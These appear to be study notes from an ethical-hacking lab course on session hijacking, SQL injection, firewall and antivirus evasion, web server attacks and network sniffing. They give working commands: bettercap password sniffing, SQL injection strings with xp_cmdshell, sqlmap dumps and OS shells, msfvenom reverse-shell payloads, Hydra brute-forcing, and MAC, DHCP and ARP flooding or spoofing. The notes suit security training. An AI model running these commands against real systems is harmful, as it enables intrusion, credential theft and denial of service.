Type in the command : `set arp.spoof.internal true` (This module spoofs the local connections among computers of the internal network.), `set arp.spoof.targets 10.10.1.11` (This module spoofs the IP Address of the Target host) & `http.proxy on` (Initiates HTTP Proxy)

Type `arp.spoof on` and press **Enter**. This module initiates ARP spoofing.

Type `net.sniff on` and press Enter. This module is responsible for performing sniffing on the network

Type` set net.sniff.regexp ‘.*password=.+’ `and press Enter. This module will only consider the packets sent with a payload matching the given regular expression (in this case, ‘.*password=.+’).


##### Intercept HTTP Traffic using Hetty
Hetty is an HTTP toolkit for security research. It aims to become an open-source alternative to commercial software such as Burp Suite Pro, with powerful features tailored to the needs of the InfoSec and bug bounty communities. Hetty can be used to perform Machine-in-the-middle (MITM) attack, manually create/edit requests, and replay proxied requests for HTTP clients and further intercept requests and responses for manual review.

Add a Project -> Handle Proxies as per requirement -> Get the requests & responses on Hetty

### Detect Session Hijacking
There are two primary methods that can be used to detect session hijacking:

- **Manual Method**: Involves using packet sniffing software such as Wireshark and SteelCentral Packet Analyzer to monitor session hijacking attacks; the packet sniffer captures packets being transferred across the network, which are then analyzed using various filtering tools
    
- **Automatic Method**: Involves using Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) to monitor incoming network traffic; if a packet matches any of the attack signatures in the internal database, the IDS generates an alert, and the IPS blocks the traffic from entering the database

##### Detect Session Hijacking using Wireshark
Wireshark allows you to capture and interactively browse the traffic running on a network. The tool uses WinPcap to capture packets, and so is only able to capture packets on networks that are supported by WinPcap. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI networks. Security professionals can use Wireshark to monitor and detect session hijacking attempts.

bettercap sends several ARP broadcast requests to the hosts (or potentially active hosts). A high number of ARP requests indicates that the system at **10.10.1.13** (the attacker’s system in this task) is acting as a client for all the IP addresses in the subnet, which means that all the packets from the victim node (in this case, **10.10.1.11**) will first go to the host system (**10.10.1.13**), and then the gateway. Similarly, any packet destined for the victim node is first forwarded from the gateway to the host system, and then from the host system to the victim node.

# SQL Injection
 It is a code injection technique that exploits a security vulnerability in a website or application’s software. SQL injection attacks use a series of malicious SQL (Structured Query Language) queries or statements to directly manipulate any type of SQL database. Applications often use SQL statements to authenticate users, validate roles and access levels, store, obtain information for the application and user, and link to other data sources. SQL injection attacks work when applications do not properly validate input before passing it to a SQL statement.

When attackers use tactics like SQL injection to compromise web applications and sites, the targeted organizations can incur huge losses in terms of money, reputation, and loss of data and functionality.

### Perform SQL Injection Attacks
SQL injection is an alarming issue for all database-driven websites. An attack can be attempted on any normal website or software package based on how it is used and how it processes user-supplied data. SQL injection attacks are performed on SQL databases with weak codes that do not adequately filter, use strong typing, or correctly execute user input. This vulnerability can be used by attackers to execute database queries to collect sensitive information, modify database entries, or attach malicious code, resulting in total compromise of the most sensitive data.

SQL injection can be used to implement the following attacks:
- **Authentication bypass**: An attacker logs onto an application without providing a valid username and password and gains administrative privileges
- **Authorization bypass**: An attacker alters authorization information stored in the database by exploiting SQL injection vulnerabilities
- **Information disclosure**: An attacker obtains sensitive information that is stored in the database
- **Compromised data integrity**: An attacker defaces a webpage, inserts malicious content into webpages, or alters the contents of a database
- **Compromised availability of data**: An attacker deletes specific information, the log, or audit information in a database
- **Remote code execution**: An attacker executes a piece of code remotely that can compromise the host OS

##### Perform an SQL Injection Attack on an MSSQL Database
Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).

Here, we will use an SQL injection query to perform SQL injection attacks on an MSSQL database.

An SQL injection query exploits the normal execution of SQL statements. It involves submitting a request with malicious values that will execute normally but return data from the database that you want. You can “inject” these malicious values in the queries, because of the application’s inability to filter them before processing. If the values submitted by users are not properly validated by an application, it is a potential target for an SQL injection attack.

`blah' or 1=1 --` : First approach is passing more than what is required i.e. `' or 1=1` and then commenting the further given SQL Code i.e. by using `--`

Blind SQL injection is used when a web application is vulnerable to an SQL injection, but the results of the injection are not visible to the attacker. It is identical to a normal SQL injection except that when an attacker attempts to exploit an application, rather than seeing a useful (i.e., information-rich) error message, a generic custom page is displayed. In blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injection.

`blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --` : This will execute the command "`ping www.certifiedhacker.com -l 65000 -t`"

##### Perform an SQL injection Attack Against MSSQL to Extract Databases using sqlmap
sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features, and a broad range of switches—from database fingerprinting and data fetching from the database to accessing the underlying file system and executing commands on the OS via out-of-band connections.

You can use sqlmap to perform SQL injection on a target website using various techniques, including Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band SQL injection.

1. `document.cookie` : To get cookie information
2. `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs`
3. `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables`
4. `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump`
5. `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell`

**Mole** (https://sourceforge.net), **Blisqy** (https://github.com), **blind-sql-bitshifting** (https://github.com), and **NoSQLMap** (https://github.com) to perform SQL injection attacks.

### Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools
By now, you will be familiar with various types of SQL injection attacks and their possible impact. To recap, the different kinds of SQL injection attacks include authentication bypass, information disclosure, compromised data integrity, compromised availability of data and remote code execution (which allows identity spoofing), damage to existing data, and the execution of system-level commands to cause a denial of service from the application.

SQL injection detection tools help to discover SQL injection attacks by monitoring HTTP traffic, SQL injection attack vectors, and determining if a web application or database code contains SQL injection vulnerabilities.

To defend against SQL injection, developers must take proper care in configuring and developing their applications in order to make them robust and secure. Developers should use best practices and countermeasures to prevent their applications from becoming vulnerable to SQL injection attacks.

##### Detect SQL Injection Vulnerabilities using DSSS
Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner that supports GET and POST parameters. DSSS scans web applications for various SQL injection vulnerabilities.

`python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie]"`

##### Detect SQL Injection Vulnerabilities using OWASP ZAP
OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. It offers automated scanners and a set of tools that allow you to find security vulnerabilities manually. It is designed to be used by people with a wide range of security experience, and as such is ideal for developers and functional testers who are new to penetration testing.

 **Acunetix Web Vulnerability Scanner** (https://www.acunetix.com), **Snort** (https://snort.org), **Burp Suite** (https://www.portswigger.net), **w3af** (https://w3af.org), to detect SQL injection vulnerabilities.


# Evading IDS, Firewalls and Honeypots
IDSs, which provide an extra layer of security to the organization’s infrastructure, are attractive targets for attackers. Attackers implement various IDS evasion techniques to bypass this security mechanism and compromise the infrastructure. Many IDS evasion techniques circumvent detect detection through multiple methods and can adapt to the best possible method for each system.

The firewall operates on a predefined set of rules. Using extensive knowledge and skill, an attacker can bypass the firewall by employing various bypassing techniques. Using these techniques, the attacker tricks the firewall to not filter the generated malicious traffic.

### Perform Intrusion Detection using Various Tools
Intrusion detection systems are highly useful as they monitor both the inbound and outbound traffic of the network and continuously inspects the data for suspicious activities that may indicate a network or system security breach. The IDS checks traffic for signatures that match known intrusion patterns and signals an alarm when a match is detected. It can be categorized into active and passive, depending on its functionality: an IDS is generally passive and is used to detect intrusions, while an intrusion prevention system (IPS) is considered as an active IDS, as it is not only used to detect the intrusion on the network, but also prevent them.

##### Detect Intrusions using Snort
Snort is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.

Uses of Snort:
- Straight packet sniffer such as tcpdump
- Packet logger (useful for network traffic debugging, etc.)
- Network intrusion prevention system

![[Pasted image 20241210142049.png]]

- `snort -dev -i 1` : To enable the Ethernet Driver
- Configure the snort.conf file, located at C:\Snort\etc.
- Open the `snort.conf` file with Notepad.
- Change the target Machine IP Address
	![[Pasted image 20241210142342.png]]

- Scroll down to RULE_PATH (Line 104). In Line 104, replace ../rules with C:\Snort\rules in Line 105, replace ../so_rules with C:\Snort\so_rules and in Line 106, replace ../preproc_rules with C:\Snort\preproc_rules.

##### Detect Malicious Network Traffic using ZoneAlarm FREE FIREWALL
ZoneAlarm FREE Firewall blocks attackers and intruders from accessing your system. It manages and monitors all incoming and outgoing traffic and shields the network from hackers, malware, and other online threats that put network privacy at risk, and monitors programs for suspicious behavior spotting and stopping new attacks that bypass traditional anti-virus protection. This Firewall prevents identity theft by guarding your data, and erases your tracks allowing you to surf the web in complete privacy. Furthermore, it locks out attackers, blocks intrusions, and makes your PC invisible online. Additionally, it filters out annoying, as well as potentially dangerous, email.

1. The **ZoneAlarm** main window appears, as shown in the screenshot. Click the **FIREWALL** button to configure the firewall settings.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/urbrflis.jpg)
    
2. In the **FIREWALL** tab, click **View Zones** under the **Basic Firewall** section.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/ramcenxf.jpg)
    
3. The **Firewall Settings** window appears with the **View Zones** tab selected; click **Add >>** and click the **Host/Site** option from the menu, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/pbkamyce.jpg)
    
4. The **Add Zone** window appears; choose the following:
    
    - Zone: **Blocked**
        
    - Hostname: **www.moviescope.com**
        
    - Description: **Block This Site**
        
    - Click **Lookup**; by doing this, we are blocking unwanted sites from browsing
        
5. You can provide any site that you wish to block.
    
    > **www.moviescope.com** is the local website that is configured on Windows Server 2019.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/o4lsou0g.jpg)
    
6. As soon as you click **Lookup**, the IP address of **www.moviescope.com** appears in the text field; click **OK**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/ukhm22xe.jpg)
    
7. The newly added rule appears in the **View Zones** section, as shown in the screenshot; click **OK**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/os3btgei.jpg)
    
8. Open any browser (here, **Google Chrome**) and now try to browse the blocked website, that is, www.moviescope.com.
    
9. As you have created a rule in ZoneAlarm Firewall to block **www.moviescope.com** from browsing, you will receive a message as **Your Internet access is blocked**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/rtcmrqj3.jpg)
    
    > This is how you can block access for unwanted sites from browsing.
    
10. Before proceeding for the next task, go to the **ZoneAlarm Firewall Settings** window, select the newly created rule in the **View Zones** section, click **Remove**, and click **OK**.
    
    > If a **Delete Confirmation** pop-up appears, click **Yes**.
    
11. This will remove the block access for the **www.moviescope.com** site.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab119331/screens/ikjccodn.jpg)



**ManageEngine Firewall Analyzer** (https://www.manageengine.com), **pfSense** (https://www.pfsense.org), **Sophos XG Firewall** (https://www.sophos.com), and **Comodo Firewall** (https://personalfirewall.comodo.com) to block access to a particular website or IP address.

##### Detect Malicious Network Traffic using HoneyBOT
HoneyBOT is a medium interaction honeypot for windows. A honeypot creates a safe environment to capture and interact with unsolicited traffic on a network. HoneyBOT is an easy-to-use solution that is ideal for network security research or as part of an early-warning IDS.

Connecting the Windows Machine having HoneyBOT -> Gets a record of Attacker connecting -> Gets the whole information regarding it.


### Evade Firewalls using Various Evasion Techniques
A firewall operates on a predefined set of rules. Using extensive knowledge and skill, an attacker can bypass the firewall by employing various bypassing techniques. Using these techniques, the attacker tricks the firewall to not filter the malicious traffic that he/she generates.

The following are some firewall bypassing techniques

- Port Scanning
- Firewalking
- Banner Grabbing
- IP Address Spoofing
- Source Routing
- Tiny Fragments
- Using an IP Address in Place of URL
- Using Anonymous Website Surfing Sites
- Using a Proxy Server
- ICMP Tunneling
- ACK Tunneling
- HTTP Tunneling
- SSH Tunneling
- DNS Tunneling
- Through External Systems
- Through MITM Attack
- Through Content
- Through XSS Attack

##### Bypass Windows Firewall using Nmap Evasion Techniques
`nmap -sS 10.10.1.11` : Checking all the 1000 TCP Ports and if the firewall has blocked the connection for a particular IP Address then it would give us no results.
`nmap -T4 -A 10.10.1.11` : For intense scan we use this command.
`nmap -sP 10.10.1.0/24` : Ping Sweep, yielding no results
`nmap -sI 10.10.1.22 10.10.1.11` : Zombie Scan yields some results over it.

##### Bypass Firewall Rules using HTTP/FTP Tunneling
HTTP tunneling technology allows attackers to perform various Internet tasks despite the restrictions imposed by firewalls. This method can be implemented if the target company has a public web server with port 80 used for HTTP traffic that is unfiltered by its firewall. This technology encapsulates data inside HTTP traffic (port 80). Many firewalls do not examine the payload of an HTTP packet to confirm that it is legitimate, thus it is possible to tunnel traffic via TCP port 80.

HTTPort allows users to bypass the HTTP proxy, which blocks Internet access to e-mail, instant messengers, P2P file sharing, ICQ, News, FTP, IRC, etc. Here, the Internet software is configured, so that it connects to a local PC as if it is the required remote server; HTTPort then intercepts that connection and runs it via a tunnel through the proxy. HTTPort can work on devices such as proxies or firewalls that allow HTTP traffic. Thus, HTTPort provides access to websites and Internet apps. HTTPort performs tunneling using one of two modes: SSL/CONNECT mode and a remote host.

The remote host method is capable of tunneling through any proxy. HTTPort uses a special server software called HTTHost, which is installed outside the proxy-blocked network. It is a web server, and thus when HTTPort is tunneling, it sends a series of HTTP requests to the HTTHost. The proxy responds as if the user is surfing a website and thus allows the user to do so. HTTHost, in turn, performs its half of the tunneling and communicates with the target servers. This mode is much slower, but works in the majority of cases and features strong data encryption that makes proxy logging useless.

- Now, you must ensure that IIS Admin Service and World Wide Web Publishing services are not running
- Click Start and click the Windows Administrative Tools app. The Windows Administrative Tools window appears; double-click Services to launch.

Creating Outbound Rules Blocking the Port 21.

##### Bypass Antivirus using Metasploit Templates
Antivirus software is designed to detect malicious processes or files and prevent their execution on endpoints. There are various techniques that can be used for bypassing antivirus and execute the malicious processes in the target machine.

`msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe` : To create a Windows/Shell_Reverse_TCP Virus

`msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe` : To create a Reverse Shell using a template

##### Bypass Firewall through Windows BITSAdmin
BITS (Background Intelligent Transfer Service) is an essential component of Windows XP and later versions of Windows operating systems. BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress.

# Hacking Web Servers
Hackers attack web servers to steal credentials, passwords, and business information. They do this using DoS, DDoS, DNS server hijacking, DNS amplification, directory traversal, Man-in-the-Middle (MITM), sniffing, phishing, website defacement, web server misconfiguration, HTTP response splitting, web cache poisoning, SSH brute force, web server password cracking, and other methods. Attackers can exploit a poorly configured web server with known vulnerabilities to compromise the security of the web application. A leaky server can harm an organization.

A client initiates the communication process through HTTP requests. When a client wants to access any resource such as web pages, photos, or videos, then the client’s browser generates an HTTP request to the web server. Depending on the request, the web server collects the requested information or content from data storage or the application servers and responds to the client’s request with an appropriate HTTP response. If a web server cannot find the requested information, then it generates an error message.

### Footprint the Web Server
By performing web server footprinting, it is possible to gather valuable system-level data such as account details, OS, software versions, server names, and database schema details. Use Telnet utility to footprint a web server and gather information such as server name, server type, OSes, and applications running. Use footprinting tools such as Netcraft, and httprecon to perform web server footprinting. Web server footprinting tools such as Netcraft, and httprecon can extract information from the target server. Let us look at the features and the types of information these tools can collect from the target server.

##### Task 1: Information Gathering using Ghost Eye
Ghost Eye is an information-gathering tool written in Python 3. To run, Ghost Eye only needs a domain or IP. Ghost Eye can work with any Linux distros if they support Python 3.

Ghost Eye gathers information such as Whois lookup, DNS lookup, EtherApe, Nmap port scan, HTTP header grabber, Clickjacking test, Robots.txt scanner, Link grabber, IP location finder, and traceroute.

`python3 ghost_eye.py` : To run the application

##### Perform Web Server Reconnaissance using Skipfish
Skipfish is an active web application (deployed on a webserver) security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments.

##### Footprint a Web Server using the httprecon Tool
Web applications can publish information, interact with Internet users, and establish an e-commerce or e-government presence. However, if an organization is not rigorous in configuring and operating its public website, it may be vulnerable to a variety of security threats. Although the threats in cyberspace remain largely the same as in the physical world (fraud, theft, vandalism, and terrorism), they are far more dangerous. Organizations can face monetary losses, damage to reputation, and legal action if an intruder successfully violates the confidentiality of their data.

##### Footprint a Web Server using Netcat and Telnet
**Netcat** : Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.

**Telnet** : Telnet is a client-server network protocol. It is widely used on the Internet or LANs. It provides the login session for a user on the Internet. The single terminal attached to another computer emulates with Telnet. The primary security problems with Telnet are the following:
- It does not encrypt any data sent through the connection.
- It lacks an authentication scheme.
Telnet helps users perform banner-grabbing attacks. It probes HTTP servers to determine the Server field in the HTTP response header.

For Netcat, use the command : `nc -vv www.moviescope.com 80`

##### Enumerate Web Server Information using Nmap Scripting Engine (NSE)
The web applications that are available on the Internet may have vulnerabilities. Some hackers’ attack strategies may need the Administrator role on your server, but sometimes they simply need sensitive information about the server. Utilizing Nmap and http-enum.nse content returns a diagram of those applications, registries, and records uncovered. This way, it is possible to check for vulnerabilities or abuses in databases. Through this technique, it is possible to discover genuine (and extremely dumb) security imperfections on a site such as some sites (like WordPress and PrestaShop) that maintain accessibility to envelopes that ought to be erased once the task has been settled. Once you have identified a vulnerability, you can discover a fix for it.

Nmap, along with Nmap Scripting Engine, can extract a lot of valuable information from the target web server. In addition to Nmap commands, Nmap Scripting Engine (NSE)provides scripts that reveal various useful information about the target web server to an attacker.

`nmap -sV --script=http-enum [target website]` : To run a Http Enumeration Script using NMAP on the given website.

`nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com` : To discover the hostnames that resolve the targeted domain.

`nmap --script http-trace -d www.goodshopping.com` : Perform HTTP Trace Attack on Targeted Domain . This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not.

`nmap -p80 --script http-waf-detect www.goodshopping.com` : Checks whether Web Application Firewall is configured on the target host or domain. This command will scan the host and attempt to determine whether a web server is being monitored by an IPS, IDS, or WAF. This command will probe the target host with malicious payloads and detect the changes in the response code.


##### Uniscan Web Server Fingerprinting
Uniscan is a versatile server fingerprinting tool that not only performs simple commands like ping, traceroute, and nslookup, but also does static, dynamic, and stress checks on a web server. Apart from scanning websites, uniscan also performs automated Bing and Google searches on provided IPs. Uniscan takes all of this data and combines them into a comprehensive report file for the user.

`uniscan -u http://10.10.1.22:8080/CEH -q` : The `-u` switch is used to provide the target URL, and the `-q` switch is used to scan the directories in the web server.

`uniscan -u http://10.10.1.22:8080/CEH -we` : `-w` and `-e` are used together to enable the file check (robots.txt and sitemap.xml file).

`uniscan -u http://10.10.1.22:8080/CEH -d` : Use the dynamic testing option by giving the command `-d`.

To get a detailed Web Report, we are required to visit the directory : `/usr/share/uniscan/report/`

##### Perform a Web Server Attack
Attackers perform web server attacks with certain goals in mind. These goals may be technical or non-technical. For example, attackers may breach the security of the web server to steal sensitive information for financial gain, or merely for curiosity’s sake. The attacker tries all possible techniques to extract the necessary passwords, including password guessing, dictionary attacks, brute force attacks, hybrid attacks, pre-computed hashes, rule-based attacks, distributed network attacks, and rainbow attacks. The attacker needs patience, as some of these techniques are tedious and time-consuming. The attacker can also use automated tools such as Brutus and THC-Hydra, to crack web passwords.

##### Crack FTP Credentials using a Dictionary Attack
A dictionary or wordlist contains thousands of words that are used by password cracking tools to break into a password-protected system. An attacker may either manually crack a password by guessing it or use automated tools and techniques such as the dictionary method. Most password cracking techniques are successful, because of weak or easily guessable passwords.

First, find the open FTP port using Nmap, and then perform a dictionary attack using the THC Hydra tool.

`hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11]` : Here we have to give two wordlists one for usernames and one for passwords.


# Sniffing
Packet sniffing allows a person to observe and access the entire network’s traffic from a given point. It monitors any bit of information entering or leaving the network. There are two types of sniffing: passive and active. Passive sniffing refers to sniffing on a hub-based network; active sniffing refers to sniffing on a switch-based network.

Sniffing is straightforward in hub-based networks, as the traffic on a segment passes through all the hosts associated with that segment. However, most networks today work on switches. A switch is an advanced computer networking device. The major difference between a hub and a switch is that a hub transmits line data to each port on the machine and has no line mapping, whereas a switch looks at the Media Access Control (MAC) address associated with each frame passing through it and sends the data to the required port. A MAC address is a hardware address that uniquely identifies each node of a network.

Packet sniffers are used to convert the host system’s NIC to promiscuous mode. The NIC in promiscuous mode can then capture the packets addressed to the specific network. There are two types of sniffing. Each is used for different types of networks. The two types are:

- **Passive Sniffing**: Passive sniffing involves sending no packets. It only captures and monitors the packets flowing in the network
    
- **Active Sniffing**: Active sniffing searches for traffic on a switched LAN by actively injecting traffic into the LAN; it also refers to sniffing through a switch


### Perform Active Sniffing
In active sniffing, ARP traffic is actively injected into a LAN to sniff around a switched network and capture its traffic. A packet sniffer can obtain all the information visible on the network and records it for future review. A pen tester can see all the information in the packet, including data that should remain hidden.

Active sniffing involves sending out multiple network probes to identify access points. The following is the list of different active sniffing techniques:

- **MAC Flooding**: Involves flooding the CAM table with fake MAC address and IP pairs until it is full
    
- **DNS Poisoning**: Involves tricking a DNS server into believing that it has received authentic information when, in reality, it has not
    
- **ARP Poisoning**: Involves constructing a large number of forged ARP request and reply packets to overload a switch
    
- **DHCP Attacks**: Involves performing a DHCP starvation attack and a rogue DHCP server attack
    
- **Switch port stealing**: Involves flooding the switch with forged gratuitous ARP packets with the target MAC address as the source
    
- **Spoofing Attack**: Involves performing MAC spoofing, VLAN hopping, and STP attacks to steal sensitive information

##### Perform MAC Flooding using macof
MAC flooding is a technique used to compromise the security of network switches that connect network segments or network devices. Attackers use the MAC flooding technique to force a switch to act as a hub, so they can easily sniff the traffic.

macof is a Unix and Linux tool that is a part of the dsniff collection. It floods the local network with random MAC addresses and IP addresses, causing some switches to fail and open in repeating mode, thereby facilitating sniffing. This tool floods the switch’s CAM tables (131,000 per minute) by sending forged MAC entries. When the MAC table fills up, the switch converts to a hub-like operation where an attacker can monitor the data being broadcast.

Command to run the attack : `macof -i eth0 -n 10` 
-  `-i`: specifies the interface and `-n`: specifies the number of packets to be sent (here, **10**).
- You can also target a single system by issuing the command `macof -i eth0 -d [Target IP Address]` (`**-d**`: Specifies the destination IP address).

##### Perform a DHCP Starvation Attack using Yersinia
In a DHCP starvation attack, an attacker floods the DHCP server by sending a large number of DHCP requests and uses all available IP addresses that the DHCP server can issue. As a result, the server cannot issue any more IP addresses, leading to a Denial-of-Service (DoS) attack. Because of this issue, valid users cannot obtain or renew their IP addresses, and thus fail to access their network. This attack can be performed by using various tools such as Yersinia and Hyenae.

Yersinia is a network tool designed to take advantage of weaknesses in different network protocols such as DHCP. It pretends to be a solid framework for analyzing and testing the deployed networks and systems.

1. Type **yersinia -I** and press **Enter** to open Yersinia in interactive mode.
    
    > **-I**: Starts an interactive ncurses session.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/svcphmni.jpg)
    
2. Yersinia interactive mode appears in the terminal window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/5p2g1uxu.jpg)
    
3. To remove the **Notification window**, press any key, and then press **h** for help.
    
4. The **Available commands** option appears, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/tsajqfoj.jpg)
    
5. Press **q** to exit the help options.
    
6. Press **F2** to select DHCP mode. In DHCP mode, **STP Fields** in the lower section of the window change to **DHCP Fields**, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/uwcknrs3.jpg)
    
7. Press **x** to list available attack options.
    
8. The **Attack Panel** window appears; press **1** to start a DHCP starvation attack.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/h1oz4vxk.jpg)
    
9. **Yersinia** starts sending DHCP packets to the network adapter and all active machines in the local network, as shown in the screenshot.
    
    > If you are using multiple targets, you will observe the same packets on all target machines.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/kswq0tfw.jpg)
    
10. After a few seconds, press **q** to stop the attack and terminate Yersinia, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/4uavi5lj.jpg)
    
11. Now, switch to the **Wireshark** window and observe the huge number of captured **DHCP** packets, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/5osnf5jt.jpg)
    
12. Click on any DHCP packet and expand the **Ethernet II** node in the packet details section. Information regarding the source and destination MAC addresses is displayed, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/yevue4er.jpg)
    
13. Close the **Wireshark** window. If an **Unsaved packets…** pop-up appears, click **Stop and Quit without Saving**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab118314/screens/x2cnjuzp.jpg)
    
14. This concludes the demonstration of how to perform a DHCP starvation attack using Yersinia.
    
15. Close all open windows and document all the acquired information.

##### Perform ARP Poisoning using arpspoof
ARP spoofing is a method of attacking an Ethernet LAN. ARP spoofing succeeds by changing the IP address of the attacker’s computer to the IP address of the target computer. A forged ARP request and reply packet find a place in the target ARP cache in this process. As the ARP reply has been forged, the destination computer (target) sends the frames to the attacker’s computer, where the attacker can modify them before sending them to the source machine (User A) in an MITM attack.

arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.

Command : `arpspoof -i eth0 -t 10.10.1.1 10.10.1.11`
(Here, 10.10.1.11 is IP address of the target system [Windows 11], and 10.10.1.1 is IP address of the access point or gateway)
-i: specifies network interface and -t: specifies target IP address.

Command : `arpspoof -i eth0 -t 10.10.1.11 10.10.1.1`
The host system informs the target system (**10.10.1.11**) that it is the access point (**10.10.1.1**).

##### Perform an Man-in-the-Middle (MITM) Attack using Cain & Abel
An attacker can obtain usernames and passwords using various techniques or by capturing data packets. By merely capturing enough packets, attackers can extract a target’s username and password if the victim authenticates themselves in public networks, especially on unsecured websites. Once a password is hacked, an attacker can use the password to interfere with the victim’s accounts such as by logging into the victim’s email account, logging onto PayPal and draining the victim’s bank account, or even change the password.

As a preventive measure, an organization’s administrator should advice employees not to provide sensitive information while in public networks without HTTPS connections. VPN and SSH tunneling must be used to secure the network connection. An expert ethical hacker and penetration tester (hereafter, pen tester) must have sound knowledge of sniffing, network protocols and their topology, TCP and UDP services, routing tables, remote access (SSH or VPN), authentication mechanisms, and encryption techniques.

Another effective method for obtaining usernames and passwords is by using Cain & Abel to perform MITM attacks.

An MITM attack is used to intrude into an existing connection between systems and to intercept the messages being exchanged. Using various techniques, attackers split the TCP connection into two connections—a client-to-attacker connection and an attacker-to-server connection. After the successful interception of the TCP connection, the attacker can read, modify, and insert fraudulent data into the intercepted communication.

MITM attacks are varied and can be carried out on a switched LAN. MITM attacks can be performed using various tools such as Cain & Abel.

Cain & Abel is a password recovery tool that allows the recovery of passwords by sniffing the network and cracking encrypted passwords. The ARP poisoning feature of the Cain & Abel tool involves sending free spoofed ARPs to the network’s host victims. This spoofed ARP can make it easier to attack a middleman.

##### Spoof a MAC Address using TMAC and SMAC
A MAC duplicating or spoofing attack involves sniffing a network for the MAC addresses of legitimate clients connected to the network. In this attack, the attacker first retrieves the MAC addresses of clients who are actively associated with the switch port. Then, the attacker spoofs their own MAC address with the MAC address of the legitimate client. Once the spoofing is successful, the attacker receives all traffic destined for the client. Thus, an attacker can gain access to the network and take over the identity of a network user.

If an administrator does not have adequate packet-sniffing skills, it is hard to defend against such intrusions. So, an expert ethical hacker and pen tester must know how to spoof MAC addresses, sniff network packets, and perform ARP poisoning, network spoofing, and DNS poisoning. This lab demonstrates how to spoof a MAC address to remain unknown to an attacker.

##### Spoof a MAC Address of Linux Machine using macchanger
A MAC address is a unique number that can be assigned to every network interface, and it is used by various systems programs and protocols to identify a network interface. It is not possible to change MAC address that is hard-coded on the NIC (Network interface controoller). However many drivers allow the MAC address to be changed. Some tools can make the operating system believe that the NIC has the MAC address of user's choice. Masking of the MAC address is known as MAC spoofing and involves changing the computer's identity. MAC spoofing can be performed using numerous tools.

Command : 

`ifconfig eth0 down` : To disable the network interface `eth0`

`macchanger -s eth0` : `-s`- prints the MAC address of the machine.

`macchanger -a eth0` : to set a random vendor MAC address to the network interface {`-a`: sets random vendor MAC address to the network interface.}

`macchanger -r eth0`  : to set a random MAC Address to the network interface

`ifconfig eth0 up` : To enable the network interface `eth0`

### Perform Network Sniffing using Various Sniffing Tools
